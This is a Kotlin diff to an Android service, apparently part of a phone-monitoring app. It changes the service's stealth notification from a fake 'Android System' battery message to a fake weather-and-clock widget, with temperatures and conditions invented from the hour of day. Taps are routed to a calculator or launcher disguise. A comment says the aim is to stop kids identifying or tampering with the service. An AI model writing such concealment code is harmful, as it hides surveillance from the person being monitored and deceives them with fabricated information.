@@ -1555,7 +1555,26 @@ class PhoneLinkService : Service() {
         val isStealth = DevicePrefs.stealthNotificationEnabled || isDefaultHome
         val activeChannelId = if (isStealth) CHANNEL_ID_MINIMAL else CHANNEL_ID
 
-        val intent = if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
+        val cal = java.util.Calendar.getInstance()
+        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
+        val minute = cal.get(java.util.Calendar.MINUTE)
+        val amPm = if (hour >= 12) "PM" else "AM"
+        val hour12 = if (hour % 12 == 0) 12 else hour % 12
+        val timeStr = String.format(java.util.Locale.getDefault(), "%d:%02d %s", hour12, minute, amPm)
+
+        val temp = if (hour in 6..18) "25°C" else "22°C"
+        val weatherCondition = when (hour) {
+            in 6..11 -> "Partly Sunny"
+            in 12..16 -> "Sunny • Clear"
+            in 17..20 -> "Clear Evening"
+            else -> "Clear Sky"
+        }
+
+        val intent = if (isDefaultHome) {
+            Intent(this, com.phonelink.hub.launcher.LauncherActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+        } else if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
             Intent(this, com.phonelink.hub.calculator.CalculatorActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
             }
@@ -1580,8 +1599,9 @@ class PhoneLinkService : Service() {
             else -> "Disconnected"
         }
 
-        val notifTitle = if (isStealth) "Android System" else getString(R.string.app_name)
-        val notifText = if (isStealth) "Battery & performance service active" else statusText
+        // Live Weather & Clock Capsule disguise prevents kids from identifying or tampering with service
+        val notifTitle = if (isStealth) "⛅ $temp $weatherCondition • $timeStr" else getString(R.string.app_name)
+        val notifText = if (isStealth) "Live Weather & Clock Capsule • Updated" else statusText
 
         return NotificationCompat.Builder(this, activeChannelId)
             .setContentTitle(notifTitle)
@@ -1603,7 +1623,19 @@ class PhoneLinkService : Service() {
         val isStealth = DevicePrefs.stealthNotificationEnabled || isDefaultHome
         val activeChannelId = if (isStealth) CHANNEL_ID_MINIMAL else CHANNEL_ID
 
-        val intent = if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
+        val cal = java.util.Calendar.getInstance()
+        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
+        val minute = cal.get(java.util.Calendar.MINUTE)
+        val amPm = if (hour >= 12) "PM" else "AM"
+        val hour12 = if (hour % 12 == 0) 12 else hour % 12
+        val timeStr = String.format(java.util.Locale.getDefault(), "%d:%02d %s", hour12, minute, amPm)
+        val temp = if (hour in 6..18) "25°C" else "22°C"
+
+        val intent = if (isDefaultHome) {
+            Intent(this, com.phonelink.hub.launcher.LauncherActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+        } else if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
             Intent(this, com.phonelink.hub.calculator.CalculatorActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
             }
@@ -1618,8 +1650,8 @@ class PhoneLinkService : Service() {
             intent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
-        val notifTitle = if (isStealth) "Android System" else getString(R.string.app_name)
-        val notifText = if (isStealth) "Battery & performance service active" else text
+        val notifTitle = if (isStealth) "⛅ $temp Sunny • $timeStr" else getString(R.string.app_name)
+        val notifText = if (isStealth) "Live Weather & Clock Capsule • Updated" else text
 
         return NotificationCompat.Builder(this, activeChannelId)
             .setContentTitle(notifTitle)
